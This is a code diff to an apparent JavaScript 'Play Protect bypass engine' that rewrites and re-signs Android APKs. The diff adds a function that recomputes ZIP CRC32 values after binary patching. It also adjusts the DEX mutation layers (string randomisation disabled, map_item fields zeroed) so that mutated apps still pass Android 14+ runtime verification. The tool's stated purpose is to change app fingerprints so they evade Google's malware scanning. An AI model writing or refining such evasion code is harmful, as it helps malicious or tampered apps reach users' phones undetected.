@@ -1450,13 +1450,74 @@ function stripSurveillancePermissions(zip) {
  * @param {Buffer} originalBuffer - The original APK file bytes
  * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
  */
+/**
+ * Repair CRC32 values in a ZIP/APK buffer.
+ * AdmZip validates CRC on getData() — if a previous binary patch (e.g. directPatchApk)
+ * modified entry data without updating CRCs, AdmZip throws BAD_CRC.
+ * This function scans all entries, decompresses data, recomputes correct CRC32,
+ * and patches both Local File Header and Central Directory entries.
+ */
+function repairZipCRCs(buf) {
+  const eocdOff = findEOCD(buf);
+  const cdOff = buf.readUInt32LE(eocdOff + 16);
+  const cdCount = buf.readUInt16LE(eocdOff + 10);
+  let repaired = 0;
+
+  let pos = cdOff;
+  for (let i = 0; i < cdCount; i++) {
+    if (pos + 46 > buf.length || buf.readUInt32LE(pos) !== 0x02014b50) break;
+    const method = buf.readUInt16LE(pos + 10);
+    const storedCRC = buf.readUInt32LE(pos + 16);
+    const compSize = buf.readUInt32LE(pos + 20);
+    const nameLen = buf.readUInt16LE(pos + 28);
+    const extraLen = buf.readUInt16LE(pos + 30);
+    const commentLen = buf.readUInt16LE(pos + 32);
+    const localOff = buf.readUInt32LE(pos + 42);
+
+    // Read local file header
+    if (localOff + 30 <= buf.length && buf.readUInt32LE(localOff) === 0x04034b50) {
+      const lfhNameLen = buf.readUInt16LE(localOff + 26);
+      const lfhExtraLen = buf.readUInt16LE(localOff + 28);
+      const dataOff = localOff + 30 + lfhNameLen + lfhExtraLen;
+
+      if (dataOff + compSize <= buf.length) {
+        try {
+          const compData = buf.slice(dataOff, dataOff + compSize);
+          const rawData = method === 8 ? zlib.inflateRawSync(compData) : Buffer.from(compData);
+          const actualCRC = computeCRC32(rawData);
+
+          if (actualCRC !== storedCRC) {
+            // Fix CRC in Central Directory
+            buf.writeUInt32LE(actualCRC, pos + 16);
+            // Fix CRC in Local File Header
+            buf.writeUInt32LE(actualCRC, localOff + 14);
+            repaired++;
+          }
+        } catch (_) {
+          // Decompression failed — skip this entry
+        }
+      }
+    }
+
+    pos += 46 + nameLen + extraLen + commentLen;
+  }
+
+  if (repaired > 0) console.log(`[Mutator] Repaired ${repaired} ZIP entry CRC32 values`);
+  return repaired;
+}
+
 function mutateAndSign(originalBuffer) {
   console.log(`[Mutator] ═══ v7.1 PLAY PROTECT BYPASS ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
   const t0 = Date.now();
 
   try {
+    // 0. Repair any stale CRC32 values (e.g. from previous directPatchApk runs)
+    //    AdmZip validates CRC on getData() and throws if mismatched.
+    const apkBuf = Buffer.from(originalBuffer);
+    repairZipCRCs(apkBuf);
+
     // 1. Parse APK
-    const zip = new AdmZip(originalBuffer);
+    const zip = new AdmZip(apkBuf);
 
     // 2. Strip existing V1 signatures
     stripSignatures(zip);
@@ -1609,16 +1670,20 @@ function mutateDexBytes(dexData) {
   // Layer 3: Strip source file references from class_defs
   const refsStripped = stripSourceFileRefs(buf);
 
-  // Layer 4: Randomize .java/.kt filename strings in string pool
-  const stringsRandomized = mutateDexStrings(buf);
+  // Layer 4: DISABLED — mutating strings breaks DEX string_ids sort order
+  // which ART verifies on load. Layers 1-3 already strip all debug info,
+  // zero-fill the data section, and disconnect source file references.
+  // const stringsRandomized = mutateDexStrings(buf);
+  const stringsRandomized = 0;
 
-  // Layer 5: Randomize map_item.unused fields + trailing padding
+  // Layer 5: Zero map_item.unused fields (DEX spec requires zero) + randomize trailing padding
   const mapSize = buf.readUInt32LE(mapOff);
   let unusedBytes = 0;
   for (let j = 0; j < mapSize; j++) {
     const itemOff = mapOff + 4 + j * 12;
     if (itemOff + 12 > fileSize) break;
-    crypto.randomBytes(2).copy(buf, itemOff + 2);
+    // DEX spec: map_item.unused MUST be zero. ART on Android 14+ rejects non-zero.
+    buf.writeUInt16LE(0, itemOff + 2);
     unusedBytes += 2;
   }
   const mapListEnd = mapOff + 4 + mapSize * 12;
